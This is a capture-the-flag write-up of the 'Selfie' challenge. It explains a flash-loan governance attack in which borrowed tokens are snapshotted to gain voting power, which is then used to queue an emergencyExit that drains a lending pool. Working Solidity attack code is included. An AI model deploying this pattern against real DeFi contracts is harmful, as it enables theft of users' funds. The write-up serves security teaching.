# Selfie Challenge Write-up

# Vulnerability

A user can take a flash loan for all tokens in the pool and immediately take a snapshot. This would, momentarily, give them the majority of tokens which they can use to propose an action in the governance contract. This action will be approved since it is based on the snapshot taken right after the flash loan, even though the user no longer holds a majority of tokens after returning the loan.

`SimpleGovernance`.- This governance contract allows token holders to propose and execute actions. However, an interesting point is that the system checks a token holder's balance at the last snapshot of token balances taken, rather than at the exact moment of proposing an action.

Part of the problem is that anyone can trigger these snapshots by calling the snapshot function on the token contract.

By taking a flash loan of all tokens in the pool and immediately triggering a snapshot, a user can momentarily control the majority of tokens.

# AttackSelfie in action

It requests a flash loan for the maximum amount of tokens available in the pool.

```solidity
function attack() public {
    uint256 amountToBorrow = pool.maxFlashLoan(address(governanceToken));
    pool.flashLoan(
        IERC3156FlashBorrower(this),
        address(pool.token()),
        amountToBorrow,
        ""
    );
}
```

Upon receiving the tokens, it takes a `snapshot` and queues an action to call the `emergencyExit` function on the pool, transferring all tokens to the attacker's address.

```solidity
function onFlashLoan(
    address initiator,
    address token,
    uint256 amount,
    uint256 fee,
    bytes calldata
) external returns (bytes32) {
    governanceToken.snapshot();  // Snapshot taken here
    pool.governance().queueAction(
        address(pool),
        0,
        abi.encodeWithSignature("emergencyExit(address)", owner)
    );
    governanceToken.approve(address(pool), amount);
    return keccak256("ERC3156FlashBorrower.onFlashLoan");
}
```

```solidity
function emergencyExit(address receiver) external onlyGovernance {
    uint256 amount = token.balanceOf(address(this));
    token.transfer(receiver, amount);

    emit FundsDrained(receiver, amount);
}
```

After a certain delay, the action is executed, draining all funds from the pool to the attacker's address.

```solidity
function flashLoan(
    IERC3156FlashBorrower _receiver,
    address _token,
    uint256 _amount,
    bytes calldata _data
) external nonReentrant returns (bool) {
    if (_token != address(token))
        revert UnsupportedCurrency();

    // Transfer the requested loan amount to the borrower
    token.transfer(address(_receiver), _amount);

    // At this point, _receiver (the borrower) temporarily has the borrowed tokens.
    // If the _receiver is a malicious contract (like AttackSelfie), it can use these tokens to create a snapshot.
    // In that snapshot, the _receiver holds a large portion (or even all) of the tokens, giving it significant voting power in the governance system.

    // The loaned amount is expected to be returned by the end of this function call
    if (_receiver.onFlashLoan(msg.sender, _token, _amount, 0, _data) != CALLBACK_SUCCESS)
        revert CallbackFailed();

    // After the onFlashLoan call, the loaned amount should be returned to this contract.
    // If not, it's a failed repayment and the transaction is reverted.
    if (!token.transferFrom(address(_receiver), address(this), _amount))
        revert RepayFailed();

    return true;
}
```
